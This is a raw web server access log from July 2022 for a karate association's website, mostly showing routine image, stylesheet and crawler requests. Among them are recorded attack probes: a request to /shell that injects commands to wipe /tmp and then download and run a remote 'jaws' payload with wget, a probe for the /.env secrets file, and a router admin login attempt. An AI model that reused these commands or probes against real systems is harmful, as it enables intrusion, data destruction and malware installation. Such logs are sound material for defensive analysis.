::ffff:73.202.170.82 - - [26/Jul/2022:00:16:32 +0000] "GET /images/fbpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:32 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:32 +0000] "GET /images/igpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:32 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:32 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:16:33 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET / HTTP/1.1" 304 - "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:06 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:07 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:07 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:10 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:14 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:17 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:21 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:25 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:41 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:19:57 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:20:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:20:28 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:20:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:20:55 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:20:59 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:21:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:21:31 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:21:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:22:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:22:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:22:31 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:22:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:23:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:23:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:23:31 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:23:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.66 - - [26/Jul/2022:00:23:52 +0000] "GET /images/mlee.jpg HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [26/Jul/2022:00:24:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:54.36.148.6 - - [26/Jul/2022:00:24:07 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [26/Jul/2022:00:24:09 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:00:24:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:205.210.31.161 - - [26/Jul/2022:00:26:04 +0000] "GET / HTTP/1.1" 200 57618 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:73.202.170.82 - - [26/Jul/2022:00:26:09 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:29:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:32:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:35:07 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:135.125.246.110 - - [26/Jul/2022:00:37:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [26/Jul/2022:00:37:57 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:38:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:177.126.59.2 - - [26/Jul/2022:00:40:44 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:41:20 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:157.55.39.140 - - [26/Jul/2022:00:41:26 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
- - - [26/Jul/2022:00:44:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:73.202.170.82 - - [26/Jul/2022:00:44:13 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:66.249.79.189 - - [26/Jul/2022:00:45:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.189 - - [26/Jul/2022:00:45:20 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:73.202.170.82 - - [26/Jul/2022:00:47:22 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:50:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:53:13 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:185.196.220.70 - - [26/Jul/2022:00:53:35 +0000] "GET / HTTP/1.1" 200 57618 "-" "Linux Gnu (cow)"
::ffff:185.191.171.22 - - [26/Jul/2022:00:55:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.45 - - [26/Jul/2022:00:55:18 +0000] "GET /sdinforeg.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:73.202.170.82 - - [26/Jul/2022:00:56:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:00:59:22 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:02:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:107.182.129.137 - - [26/Jul/2022:01:03:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/MBS.gif HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
